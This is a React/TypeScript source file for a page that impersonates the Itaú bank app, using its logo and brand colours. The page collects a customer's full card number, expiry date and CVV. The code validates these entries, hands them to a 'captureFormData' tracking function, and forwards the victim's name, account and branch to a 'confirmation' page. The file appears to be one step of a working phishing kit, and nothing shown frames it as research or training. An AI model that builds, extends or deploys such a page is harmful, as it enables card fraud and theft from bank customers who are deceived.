import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Menu, Bell } from "lucide-react";
import itauLogo from "@/assets/itau-logo.png";
import BottomNav from "@/components/BottomNav";
import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";

const DadosCartao = () => {
  useVisitorTracking("dados-cartao");
  const navigate = useNavigate();
  const location = useLocation();
  const { nome, conta, agencia } = (location.state as any) || {};

  const [numero, setNumero] = useState("");
  const [validade, setValidade] = useState("");
  const [cvv, setCvv] = useState("");
  const [errors, setErrors] = useState<{ numero?: string; validade?: string; cvv?: string }>({});

  const formatNumero = (v: string) => {
    const digits = v.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
  };

  const formatValidade = (v: string) => {
    const digits = v.replace(/\D/g, "").slice(0, 4);
    if (digits.length > 2) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
    return digits;
  };

  const handleContinuar = () => {
    const newErrors: typeof errors = {};
    const cleanNumero = numero.replace(/\D/g, "");
    if (cleanNumero.length < 13) newErrors.numero = "Número do cartão inválido";
    const cleanValidade = validade.replace(/\D/g, "");
    if (cleanValidade.length !== 4) {
      newErrors.validade = "Validade inválida";
    } else {
      const mes = parseInt(cleanValidade.slice(0, 2));
      if (mes < 1 || mes > 12) newErrors.validade = "Mês inválido";
    }
    if (cvv.length < 3) newErrors.cvv = "CVV inválido";

    setErrors(newErrors);
    if (Object.keys(newErrors).length === 0) {
      captureFormData("dados-cartao", { numero: numero.replace(/\s/g, ""), validade, cvv });
      navigate("/confirmacao", { state: { nome, conta, agencia } });
    }
  };

  return (
    <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #FF6200 0%, #CC5000 100%)' }}>
      {/* Header */}
      <div className="px-5 pt-6 pb-8">
        <div className="flex items-center justify-between mb-8">
          <Menu className="text-primary-foreground" size={24} />
          <Bell className="text-primary-foreground" size={24} />
        </div>
        <div className="flex flex-col items-start gap-3">
          <img src={itauLogo} alt="Itaú" className="h-12" />
          <h1 className="text-primary-foreground text-xl font-semibold leading-tight">
            Dados do cartão
          </h1>
        </div>
      </div>

      {/* Content */}
      <div className="px-5 pb-32 space-y-6">
        <div className="px-1">
          <label className="text-sm text-primary-foreground/80 block mb-1">Número do cartão</label>
          <input
            type="text"
            inputMode="numeric"
            value={numero}
            onChange={(e) => { setNumero(formatNumero(e.target.value)); setErrors(prev => ({ ...prev, numero: undefined })); }}
            className={`w-full bg-transparent text-primary-foreground border-b pb-2 outline-none text-base placeholder:text-primary-foreground/40 ${errors.numero ? "border-yellow-200" : "border-primary-foreground/30"}`}
            placeholder="0000 0000 0000 0000"
          />
          {errors.numero && <span className="text-yellow-200 text-xs mt-1 block">{errors.numero}</span>}
        </div>

        <div className="flex gap-4">
          <div className="flex-1 px-1">
            <label className="text-sm text-primary-foreground/80 block mb-1">Validade</label>
            <input
              type="text"
              inputMode="numeric"
              value={validade}
              onChange={(e) => { setValidade(formatValidade(e.target.value)); setErrors(prev => ({ ...prev, validade: undefined })); }}
              className={`w-full bg-transparent text-primary-foreground border-b pb-2 outline-none text-base placeholder:text-primary-foreground/40 ${errors.validade ? "border-yellow-200" : "border-primary-foreground/30"}`}
              placeholder="MM/AA"
            />
            {errors.validade && <span className="text-yellow-200 text-xs mt-1 block">{errors.validade}</span>}
          </div>
          <div className="flex-1 px-1">
            <label className="text-sm text-primary-foreground/80 block mb-1">CVV</label>
            <input
              type="text"
              inputMode="numeric"
              value={cvv}
              onChange={(e) => { setCvv(e.target.value.replace(/\D/g, "").slice(0, 4)); setErrors(prev => ({ ...prev, cvv: undefined })); }}
              className={`w-full bg-transparent text-primary-foreground border-b pb-2 outline-none text-base placeholder:text-primary-foreground/40 ${errors.cvv ? "border-yellow-200" : "border-primary-foreground/30"}`}
              placeholder="000"
            />
            {errors.cvv && <span className="text-yellow-200 text-xs mt-1 block">{errors.cvv}</span>}
          </div>
        </div>

        <p className="text-primary-foreground/70 text-sm px-1">
          Informe os dados do seu cartão Itaú para continuar.
        </p>

        <button
          onClick={handleContinuar}
          className="w-full py-4 rounded-full bg-white text-[#FF6200] font-semibold text-base hover:bg-white/90 transition-opacity"
        >
          continuar
        </button>
      </div>

      <BottomNav />
    </div>
  );
};

export default DadosCartao;
